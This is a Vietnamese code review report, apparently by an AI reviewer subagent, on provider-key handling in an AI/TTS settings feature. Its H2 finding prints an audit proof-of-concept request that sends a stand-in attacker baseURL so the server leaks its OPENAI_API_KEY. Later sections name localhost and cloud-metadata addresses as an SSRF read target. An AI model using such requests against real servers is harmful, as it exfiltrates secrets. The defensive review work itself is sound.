# Code review — AI + TTS Settings mở rộng

- **Plan**: `plans/260727-2055-ai-tts-settings-expansion/`
- **Ngày**: 2026-07-27
- **Reviewer**: `code-reviewer` subagent · **Status**: DONE_WITH_CONCERNS
- **Phạm vi**: 16 file sửa / 13 file mới / 1 file xoá, ~800 dòng thêm
- **Trạng thái xử lý**: đã sửa toàn bộ H1/H2/M1/M2/M4/M5 + 3 mục Low; M3 ghi vào `docs/known-gaps.md`

## Kết luận

Nền tốt (sentinel 3 trạng thái, DTO xoá hẳn `apiKey`, golden hash `ttsCacheKey`, PIN baseURL
preset). Nhưng có **một lỗ hổng xuyên suốt: key được coi là chuỗi độc lập thay vì cặp
(provider, key)** — gây 2 lỗi nghiêm trọng độc lập nhau. Cả hai đều được reviewer kiểm chứng
bằng chạy thật, không phải suy đoán từ đọc code.

## Phát hiện và cách xử

### H1 (Cao) — Đổi provider mà không gõ lại key ⇒ key nhà A bị lưu và GỬI sang nhà B

`lib/settings.ts` `writeAiSettings` · `components/settings/provider-section.tsx` `pickProvider`

`resolveKeySentinel(next, prev)` trả `prev` khi `next === null` mà không so provider. UI đổi
provider chỉ reset `model`, giữ `hasKey`/`keyMask` nên placeholder vẫn viết
"••••1234 (để trống = giữ nguyên)".

Kịch bản đã chứng minh:

```
vision = zai + key "sk-ZAI-SECRET" → đổi provider sang google, không gõ ô key → Lưu
⇒ vision.apiKey = sk-ZAI-SECRET, baseURL = generativelanguage.googleapis.com
⇒ secret z.ai gửi thẳng tới Google; GEMINI_API_KEY không bao giờ được dùng
   (resolveApiKey chỉ fallback ENV khi cfg.apiKey rỗng)
```

Đây **chính là AC2** (Vision z.ai + Biên kịch Gemini) — nếu không sửa thì AC2 fail lúc nghiệm
thu bằng key thật. Gốc rễ là quyết định lệch plan (b) của người implement: ý định (không làm
gãy thao tác "bỏ tick dùng chung") đúng, nhưng thiếu vế "provider trùng".

Đáng chú ý: `resolveProbeApiKey` ĐÃ có guard `saved?.provider === provider`. Bất biến đúng
được nhận ra ở đường probe nhưng không áp cho đường ghi.

**Đã sửa**: `keyOf(cfg, provider)` chỉ trả key khi provider trùng, áp cho cả 3 nhánh
`vision`/`script`/`tts`. UI reset `hasKey`/`keyMask`/`clearKey` khi đổi provider (cả
`provider-section` lẫn `tts-section`). Test mục 19-21 `verify-settings.mts` viết trước khi sửa.

### H2 (Cao) — `provider:'custom'` biến route probe thành công cụ rút `OPENAI_API_KEY`

`lib/settings.ts` `resolveProbeApiKey` · 4 route probe

`custom` (đúng thiết kế) nhận `baseURL` từ body, nhưng `resolveProbeApiKey` khi không có key
draft lại rơi xuống `resolveApiKey` → `getPreset('custom').keyEnv = 'OPENAI_API_KEY'` → ENV.

```
POST /api/settings/models {provider:'custom', baseURL:'http://kẻ-tấn-công'}   (body KHÔNG có apiKey)
⇒ host lạ nhận Authorization: Bearer sk-ENV-OPENAI-TOPSECRET
```

Với `content-type: text/plain` (CORS *simple request*, không preflight) route vẫn parse bình
thường — `Request.json()` không kiểm content-type. Một trang web bất kỳ đang mở cùng trình
duyệt sai khiến được server gửi key đi; họ không cần đọc response.

Đây **không phải** vấn đề thiếu auth (app local single-user là posture đã chốt) mà là
confused deputy: route nhận **host đích** từ input không tin cậy rồi tự đính secret vào.

**Đã sửa (2 lớp)**:
1. `provider === 'custom'` KHÔNG fallback ENV. Key chỉ đến từ ô người dùng vừa gõ, hoặc key
   đã lưu **cho đúng `baseURL` đó**.
2. `isCrossSiteRequest()` — từ chối 403 khi `sec-fetch-site: cross-site`, áp cho cả 4 route
   probe. Header vắng mặt (curl/CLI/test) vẫn cho qua.

Chưa làm: chặn host private/loopback ở `/test`, và bỏ echo `upstream.slice(0,200)`. Xem
"Còn tồn" bên dưới.

### M1 (Trung bình) — Hồi quy nhánh ENV thuần

`envExtraParams` suy provider bằng `baseURL?.includes('api.z.ai')`. Endpoint GLM không nằm ở
host đó (`open.bigmodel.cn`, proxy nội bộ) mất param tắt-thinking im lặng ⇒ mất ~50% token
tiết kiệm, không lỗi, không cảnh báo. Vi phạm ràng buộc "backward-compat tuyệt đối cho nhánh
ENV thuần".

**Đã sửa**: nhánh ENV cứ gửi thẳng param GLM khi cờ bật, y như trước — không suy diễn gì.
Việc chọn đúng dạng param theo nhà cung cấp chỉ thuộc về nhánh có settings
(`stageExtraParams`). Test mục 18 khoá lại bằng host `open.bigmodel.cn`.

### M2 (Trung bình) — `load()` lỗi mà nút Lưu vẫn bấm được ⇒ xoá sạch cấu hình

`finally { setLoading(false) }` chạy cả khi `fetch` ném; state vẫn là draft rỗng. Mở dialog
đúng lúc server restart → chỉnh đại → Lưu → PUT gửi `script: null, tts: null` và vì PUT là
replace-toàn-tài-liệu, cấu hình Biên kịch riêng + toàn bộ TTS **bị xoá**.

**Đã sửa**: cờ `loaded` chỉ bật khi GET thành công; mọi control và cả 2 nút footer khoá theo
`!loaded`.

### M3 (Trung bình) — File v1 nhận thêm param mà không ai bấm gì

`max_tokens: 16384` tự áp cho google/zai (là **trần**, không phải sàn — chương dài có thể
chạm trần rồi `ModelOutputError`), và cờ `disableThinking: true` của file v1 bắt đầu có tác
dụng thật với OpenRouter (`{reasoning:{exclude:true}}`) trong khi trước là no-op.

**Xử**: giữ hành vi (plan đã chốt, user đã duyệt), ghi rõ vào `docs/known-gaps.md` kèm cách
chữa. AC6 chỉ hứa "không mất cấu hình" — hai điểm này nằm ngoài lời hứa đó nên phải nói ra.

### M4 (Trung bình) — Key ElevenLabs mồ côi dưới provider `capcut`

UI ẩn cả ô key lẫn nút "Xoá key" khi provider không cần key ⇒ key nằm lại trong
`.settings.json` vĩnh viễn. Không có đường exfil (`capcut.ts` không đọc `cfg.apiKey`, đã grep)
nhưng vẫn là secret sống lâu ngoài ý muốn. **Đã sửa** cùng H1. Test mục 21.

### M5 (Trung bình) — `pnpm test:unit` gọi API CapCut THẬT qua mạng

`verify-tts-settings.mts` case 13 dùng provider `capcut` mà không đặt `CAPCUT_BASE_URL` →
unit suite ping API nội bộ không chính thức mỗi lần chạy: chậm, flaky, và assertion chỉ là
"response không chứa key" nên vẫn "pass" khi lỗi (**phantom test**).

**Đã sửa**: đổi sang provider `elevenlabs` + trỏ vào port chết để ép nhánh lỗi, assert thêm
`status === 502`. Vế cần khoá ("không trả key kể cả khi lỗi") vẫn được chứng minh.

### Low — đã sửa

- `getPreset(body.provider)` nuốt provider lạ → âm thầm probe OpenAI. Nay trả **400**.
- `URL.revokeObjectURL` chỉ gắn `ended` → rò object URL khi `play()` bị chặn. Nay thu hồi ở
  mọi đường kết thúc + thông điệp riêng cho autoplay policy.
- `/tts/preview` trả 502 cho cả lỗi cấu hình (id provider sai). Nay **400**.
- Bỏ phantom assertion `!TTS_PREVIEW_SAMPLE.includes('undefined')` → ghim giá trị chính xác.

## Phản biện 3 quyết định lệch plan

| # | Quyết định | Kết luận reviewer |
|---|---|---|
| (a) | Migration v1 `scriptModel` rỗng → giữ `script` riêng, KHÔNG null | **ĐÚNG.** Plan (phase-02 + test #10) sai. Đã sửa plan. |
| (b) | Script tách khỏi vision thì thừa kế key vision | **SAI** ở trường hợp cross-provider — gốc của H1. Đã sửa code. |
| (c) | `readTtsConfig` gate `saved.provider === provider` | **ĐÚNG.** phase-05 tự mâu thuẫn: công thức dòng 39 không thể thoả chính test #5 của nó. Đã sửa plan. |

Cạnh sắc reviewer chỉ thêm ở (a): bật lại tick "dùng chung" rồi Lưu sẽ **âm thầm đổi model
biên kịch** từ `SCRIPT_MODEL` sang model của Vision. **Đã thêm dòng hint** ngay dưới switch.

## Đã kiểm và KHÔNG hỏng

- `ttsCacheKey` bất biến — golden hash `fd4be6e9…` nguyên vẹn, audio đã trả phí an toàn
- AC3 vững — test assert trên **toàn chuỗi JSON** response, không từng field
- Nhánh ENV thuần không tự áp `max_tokens`; `SETTINGS_FILE=/dev/null` → null, không cache bẩn
- Không component client nào import `lib/settings`; `lib/ai-providers.ts` đúng là data thuần
- Lint React: fetch trong event handler, `useRef` chỉ đọc/ghi trong handler — không vi phạm
- Không còn call-site nào dùng contract cũ (`keys`, GET `/models`, `resolveApiKey(provider)`,
  `disableThinking`)
- Scope drift: không — mọi file đụng tới đều thuộc phạm vi plan
- Lint suppression / catch-and-swallow mới: 0

## Còn tồn (chưa làm, có chủ đích)

1. `/api/settings/test` vẫn echo `upstream.slice(0, 200)` → về lý thuyết là primitive đọc
   service localhost (`127.0.0.1:11434`, `169.254.169.254`). Đã hạ rủi ro bằng lớp
   `isCrossSiteRequest`; muốn chặt hơn thì bỏ echo hoặc chặn host private. **Cần user quyết**
   vì echo body chính là thứ làm nút "Kiểm tra" hữu ích.
2. `modelsCache` không giới hạn kích thước; client có thể bơm entry qua `custom`. Bộ nhớ,
   không phải bảo mật; app local single-user nên tác động thấp.
3. Đổi giọng mặc định giữa chừng một job → video trộn 2 giọng. Vốn đã tồn tại trước plan.
   Ghi vào `docs/known-gaps.md`.

## Trạng thái AC sau khi sửa

| AC | Trạng thái |
|---|---|
| AC1 Google end-to-end | **Chưa nghiệm thu** — thiếu `GEMINI_API_KEY` của user |
| AC2 Vision z.ai + Biên kịch Gemini | **Chưa nghiệm thu** — thiếu key. H1 (thứ sẽ làm nó fail) đã sửa + có test khoá |
| AC3 GET không rò key | PASS (unit + curl trên server thật) |
| AC4 Round-trip key | PASS (unit + UI thật; nay phủ cả trường hợp đổi provider) |
| AC5 TTS | PASS nhánh CapCut (dropdown 8 giọng, nghe thử 48KB mp3, cache HIT 13ms vs 2649ms). Nhánh ElevenLabs chỉ có mock — user không có key |
| AC6 File v1 | PASS (file v1 thật của user) — kèm 2 đổi hành vi ngầm đã ghi known-gaps |
| AC7 `SETTINGS_FILE=/dev/null` | PASS (e2e chạy 2 lần: trước và sau khi sửa) |
| lint / build / tsc / test:unit | PASS |

## Câu hỏi còn treo

1. `/api/settings/test`: giữ echo thông điệp upstream (hữu ích) hay bỏ (an toàn hơn)?
2. `max_tokens` mặc định 16384: có muốn chỉ áp cho stage **vision** và để **script** theo mặc
   định endpoint không? Kịch bản gãy của M3 gần như chỉ xảy ra ở biên kịch chương dài.
